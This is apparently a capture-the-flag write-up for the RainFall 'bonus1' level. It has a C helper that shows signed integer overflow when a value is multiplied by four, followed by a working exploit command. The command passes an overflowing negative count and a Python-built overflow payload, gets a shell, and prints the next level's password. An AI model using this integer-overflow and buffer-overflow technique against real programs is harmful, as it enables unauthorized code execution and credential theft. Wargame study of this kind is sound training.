
- simple c programm that translate a signed intiger to its 3 forms (hexadicimal, signed int, unsigned int)
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>


int main(int argc, char **argv) {

    int nb = atoi(argv[1]);

    printf("    => to Hex           ---> 0x%08x\n",nb * 4);
    printf("    => to Signed Int        ---> %d\n", nb * 4);
    printf("    => to Unsigned Int      ---> %zu\n", nb * 4);

    return (0);
}
```
```shell
e2r8p7% ./findit -1
	=> to Hex			---> 0xfffffffc
	=> to Signed Int		---> -4
	=> to Unsigned Int		---> 4294967292

e2r8p7% ./findit -2
	=> to Hex			---> 0xfffffff8
	=> to Signed Int		---> -8
	=> to Unsigned Int		---> 4294967288

e2r8p7% ./findit -2147483648
	=> to Hex			---> 0x00000000
	=> to Signed Int		---> 0
	=> to Unsigned Int		---> 0

e2r8p7% ./findit -2147483647
	=> to Hex			---> 0x00000004
	=> to Signed Int		---> 4
	=> to Unsigned Int		---> 4

e2r8p7% ./findit -2147483645
	=> to Hex			---> 0x0000000c
	=> to Signed Int		---> 12
	=> to Unsigned Int		---> 12

e2r8p7% ./findit -2147483630
	=> to Hex			---> 0x00000048
	=> to Signed Int		---> 72
	=> to Unsigned Int		---> 72

e2r8p7% ./findit -2147483635
	=> to Hex			---> 0x00000034
	=> to Signed Int		---> 52
	=> to Unsigned Int		---> 52

e2r8p7% ./findit -2147483637
	=> to Hex			---> 0x0000002c
	=> to Signed Int		---> 44
	=> to Unsigned Int		---> 44

```


#### Solution && Exploit
```
bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c "print 'A' * 40 + '\x46\x4c\x4f\x57'")
$ cd /home/user/bonus2
$ cat .pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$
```